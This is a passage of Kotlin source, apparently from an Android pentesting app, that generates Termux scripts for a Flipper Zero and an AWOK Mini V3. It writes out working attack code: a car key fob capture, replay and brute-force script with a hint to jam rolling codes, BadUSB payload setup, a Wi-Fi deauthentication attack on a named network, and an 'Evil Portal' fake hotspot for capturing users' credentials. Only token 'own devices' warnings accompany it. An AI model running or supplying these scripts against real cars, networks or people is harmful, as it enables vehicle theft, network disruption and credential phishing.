            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üì° SUPPORTED FREQUENCIES:"
            echo "   ‚Ä¢ 315 MHz (North America)"
            echo "   ‚Ä¢ 433.92 MHz (Europe, Asia)"
            echo "   ‚Ä¢ 868 MHz (Europe)"
            echo ""
            echo "üéØ METHOD 1: Capture & Replay (Recommended)"
            echo "   1. Connect Flipper via USB-C"
            echo "   2. Run script below to capture signal"
            echo "   3. Press car key fob button when prompted"
            echo "   4. Replay saved signal from Flipper menu"
            echo ""
            echo "‚ö†Ô∏è  WARNING: Modern cars use rolling codes - capture works ONCE"
            echo ""
            echo "üéØ METHOD 2: Brute Force Fixed Codes (Older Cars)"

            # Install pyFlipper
            pip install pyserial pyflipper || echo "Dependencies ready"

            # Create car key fob brute force script
            cat > /tmp/car_keyfob_attack.py << 'CARFOB'
import serial
import time

print("üöó Car Key Fob Attack - Flipper Zero")
print("=" * 50)

# Connect to Flipper
try:
    flipper = serial.Serial('/dev/ttyACM0', 115200, timeout=1)
    print("‚úÖ Connected to Flipper Zero")
except:
    print("‚ùå Error: Connect Flipper Zero via USB-C first!")
    exit(1)

print("")
print("Select attack mode:")
print("1) Capture & Replay (Works on all cars)")
print("2) Brute Force Fixed Code (Older cars only)")
print("")

mode = input("Enter choice (1 or 2): ")

if mode == "1":
    print("\nüì° CAPTURE MODE")
    print("-" * 50)

    # Try common frequencies
    frequencies = [315.0, 433.92, 868.0]

    for freq in frequencies:
        print(f"\nüì° Listening on {freq} MHz...")
        print(">>> Press your car key fob button NOW <<<")

        flipper.write(f"subghz rx {freq}\\r\\n".encode())
        time.sleep(5)

        # Check for captured signal
        flipper.write(b"subghz decode_raw\\r\\n")
        response = flipper.read(2048).decode()

        if "Protocol" in response:
            print(f"‚úÖ SIGNAL CAPTURED at {freq} MHz!")
            print(response)

            # Save the signal
            filename = f"car_key_{int(freq)}mhz"
            flipper.write(f"subghz save {filename}\\r\\n".encode())
            time.sleep(1)

            print(f"\nüíæ Saved as: {filename}")
            print("\nüéØ TO UNLOCK CAR:")
            print(f"   1. On Flipper: Sub-GHz ‚Üí Saved")
            print(f"   2. Select: {filename}")
            print(f"   3. Press 'Send' near your car")
            break
    else:
        print("\n‚ùå No signal captured. Try again with key fob closer to Flipper.")

elif mode == "2":
    print("\n‚ö° BRUTE FORCE MODE (Fixed Code)")
    print("-" * 50)
    print("‚ö†Ô∏è  This only works on older cars (pre-2000)")
    print("‚ö†Ô∏è  Modern cars use rolling codes - this will NOT work")
    print("")

    freq = 315.0  # Most common
    print(f"Frequency: {freq} MHz")
    print("Protocol: Princeton/PT2260")
    print("")
    print("Brute forcing 4096 codes...")
    print("(This may take 10-15 minutes)")
    print("")

    for code in range(4096):
        if code % 100 == 0:
            print(f"Progress: {code}/4096 codes tested...")

        # Send code
        flipper.write(f"subghz tx {freq} princeton {code:04d}\\r\\n".encode())
        time.sleep(0.1)

        # Check if user pressed Ctrl+C
        # (In real scenario, car would unlock if correct code found)

    print("\n‚úÖ Brute force complete!")
    print("If car unlocked, note the working code number.")

else:
    print("Invalid choice!")

print("\nüê¨ Closing Flipper connection...")
flipper.close()
print("‚úÖ Done!")

print("\nüí° PRO TIP:")
print("   ‚Ä¢ Capture mode works on ALL cars (one-time use)")
print("   ‚Ä¢ Brute force only works on very old cars with fixed codes")
print("   ‚Ä¢ For rolling codes, use AWOK Mini V3 to jam + replay")
CARFOB

            echo ""
            echo "‚ñ∂Ô∏è  Run: python /tmp/car_keyfob_attack.py"
            echo ""
            echo "üîê ADVANCED: Rolling Code Attack (Requires AWOK Mini V3)"
            echo "   ‚Ä¢ Uses jam + replay technique"
            echo "   ‚Ä¢ Works on modern cars with rolling codes"
            echo "   ‚Ä¢ Need: Flipper + AWOK Mini V3 + 2 antennas"
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("\n‚ö†Ô∏è  LEGAL: Only use on YOUR OWN vehicles!\n")
        appendOutput("üí° Most effective on older cars (2000 and earlier)\n\n")
    }

    private fun executeFlipperBadUSB() {
        appendOutput("\n‚å®Ô∏è  Flipper Zero: BadUSB Payload Execute\n\n")
        appendOutput("üìã BADUSB PAYLOADS:\n\n")
        appendOutput("Example 1: Open Calculator\n")
        appendOutput("Example 2: Rick Roll\n")
        appendOutput("Example 3: Reverse Shell\n\n")

        val script = """
            # Create example BadUSB payload
            mkdir -p ~/flipper/badusb

            # Payload 1: Simple calculator
            cat > ~/flipper/badusb/calc.txt << 'PAYLOAD'
REM Open calculator on target PC
DELAY 1000
GUI r
DELAY 500
STRING calc
DELAY 500
ENTER
PAYLOAD

            # Payload 2: Prank payload
            cat > ~/flipper/badusb/rickroll.txt << 'PAYLOAD'
REM Rick Roll prank
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 500
ENTER
PAYLOAD

            echo "‚úÖ BadUSB payloads created in ~/flipper/badusb/"
            echo ""
            echo "üìã TO USE:"
            echo "1. Copy payload files to Flipper Zero SD card: /badusb/"
            echo "2. On Flipper: BadUSB ‚Üí Select payload ‚Üí Run"
            echo "3. Flipper will act as keyboard and type commands"
            echo ""
            echo "‚ö†Ô∏è  WARNING: Only use on devices you own!"
        """.trimIndent()

        executeTermuxCommand(script)
    }

    // ========== AWOK Mini V3 Functions ==========

    private fun executeAwokWardriving() {
        appendOutput("\nüó∫Ô∏è  AWOK Mini V3: WiFi Wardriving with GPS\n\n")

        val script = """
            echo "üì° AWOK Mini V3 Wardriving Setup"
            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üìã PREREQUISITES:"
            echo "1. AWOK Mini V3 attached to Flipper Zero"
            echo "2. ESP32 Marauder firmware flashed"
            echo "3. GPS module enabled (DIP switch)"
            echo ""
            echo "üéØ WARDRIVING STEPS:"
            echo ""
            echo "METHOD 1: Via Flipper Zero Screen"
            echo "  ‚Ä¢ Connect AWOK to Flipper GPIO"
            echo "  ‚Ä¢ Apps ‚Üí ESP32 ‚Üí Marauder"
            echo "  ‚Ä¢ Select: WiFi ‚Üí Scan APs"
            echo "  ‚Ä¢ GPS data logged automatically"
            echo ""
            echo "METHOD 2: Via Serial (Advanced)"

            pkg install screen python -y

            cat > /tmp/awok_wardrive.py << 'AWOKPY'
import serial
import time
import json

# Connect to AWOK Mini V3 (check which port - white or orange)
esp = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

print("üì° Starting WiFi scan with GPS logging...")

# Send Marauder commands
esp.write(b"scanap\\r\\n")

print("Scanning for 60 seconds...")
time.sleep(60)

# Get results
esp.write(b"list\\r\\n")
time.sleep(2)

results = esp.read(4096).decode()
print("\\nüìä RESULTS:\\n")
print(results)

# Save to file
with open('/sdcard/pentest/wardrive_results.txt', 'w') as f:
    f.write(results)

print("\\n‚úÖ Results saved to /sdcard/pentest/wardrive_results.txt")
esp.close()
AWOKPY

            echo ""
            echo "Run: python /tmp/awok_wardrive.py"
            echo ""
            echo "üí° Results include: SSID, BSSID, Channel, Signal, GPS coordinates"
        """.trimIndent()

        executeTermuxCommand(script)
    }

    private fun executeAwokDeauth(ssid: String) {
        appendOutput("\nüí• AWOK Mini V3: Deauth Attack on $ssid\n\n")

        val script = """
            echo "‚ö†Ô∏è  Deauthentication Attack Setup"
            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üéØ Target: $ssid"
            echo ""
            echo "METHOD 1: Via Flipper Zero"
            echo "  ‚Ä¢ Apps ‚Üí ESP32 ‚Üí Marauder"
            echo "  ‚Ä¢ Select target AP from scan list"
            echo "  ‚Ä¢ Attack ‚Üí Deauth"
            echo ""
            echo "METHOD 2: Via Serial Commands"

            python3 << 'DEAUTHPY'
import serial
import time

esp = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

print("üì° Scanning for target network...")
esp.write(b"scanap\\r\\n")
time.sleep(10)

print("üí• Starting deauth attack on $ssid...")
print("This will disconnect all clients from the network")
print("(Running for 30 seconds...)")

esp.write(b"attack -t deauth -s $ssid\\r\\n")
time.sleep(30)

esp.write(b"stopscan\\r\\n")
print("\\n‚úÖ Attack complete!")
esp.close()
DEAUTHPY
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("üí° Use this to force WPA handshake capture!\n\n")
    }

    private fun executeAwokEvilPortal() {
        appendOutput("\nüé£ AWOK Mini V3: Evil Portal (Captive Portal)\n\n")

        val script = """
            echo "üé£ Evil Portal Attack Setup"
            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üìã WHAT IT DOES:"
            echo "Creates fake WiFi hotspot that shows captive portal"
            echo "Can capture credentials from unsuspecting users"
            echo ""
            echo "‚ö†Ô∏è  LEGAL WARNING: Only use on your own devices!"
            echo ""
            echo "üéØ SETUP:"
            echo "1. Via Flipper Zero:"
            echo "   ‚Ä¢ Apps ‚Üí ESP32 ‚Üí Marauder"
            echo "   ‚Ä¢ Evil Portal ‚Üí Start"
            echo "   ‚Ä¢ Customize portal HTML if needed"
            echo ""
            echo "2. Via Web Interface:"
            echo "   ‚Ä¢ Connect to AWOK Mini V3 WiFi"
            echo "   ‚Ä¢ Browse to: 192.168.4.1"
            echo "   ‚Ä¢ Configure Evil Portal settings"
            echo ""
            echo "3. Via Serial:"

            cat > /tmp/evil_portal.py << 'PORTALPY'
import serial
import time

esp = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

print("üé£ Starting Evil Portal...")

# Start evil portal
esp.write(b"evilportal start\\r\\n")
time.sleep(2)

print("‚úÖ Evil Portal running!")
print("")
print("üì° SSID: Free WiFi")
print("üåê Portal URL: 192.168.4.1")
print("üìä Monitor: Check Flipper screen for captured data")
print("")
print("Press Ctrl+C to stop...")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    esp.write(b"evilportal stop\\r\\n")
    print("\\n‚úÖ Evil Portal stopped")
    esp.close()
PORTALPY

            echo ""
            echo "Run: python /tmp/evil_portal.py"
        """.trimIndent()

        executeTermuxCommand(script)
    }

    private fun executeAwokBLEScan() {
        appendOutput("\nüì∂ AWOK Mini V3: BLE Device Scanner\n\n")

        val script = """
            echo "üì∂ Bluetooth Low Energy Scanner"
            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üéØ Via Flipper Zero:"
            echo "  ‚Ä¢ Apps ‚Üí ESP32 ‚Üí Marauder"
            echo "  ‚Ä¢ Bluetooth ‚Üí Scan BLE"
            echo ""
            echo "üéØ Via Serial:"

            python3 << 'BLEPY'
import serial
import time

esp = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

print("üì° Scanning for BLE devices...")

esp.write(b"ble scan\\r\\n")

print("Scanning for 30 seconds...")
time.sleep(30)

esp.write(b"ble stop\\r\\n")
time.sleep(1)

# Get results
esp.write(b"ble list\\r\\n")
time.sleep(2)

results = esp.read(4096).decode()
print("\\nüìä BLE DEVICES FOUND:\\n")
print(results)

# Save results
with open('/sdcard/pentest/ble_scan_results.txt', 'w') as f:
    f.write(results)

print("\\n‚úÖ Results saved to /sdcard/pentest/ble_scan_results.txt")
esp.close()
BLEPY

            echo ""
            echo "üí° TIP: BLE devices include:"
            echo "   - Fitness trackers, smartwatches"
            echo "   - Bluetooth headphones"
            echo "   - Smart home devices"
            echo "   - Car key fobs"
        """.trimIndent()

        executeTermuxCommand(script)
    }
}
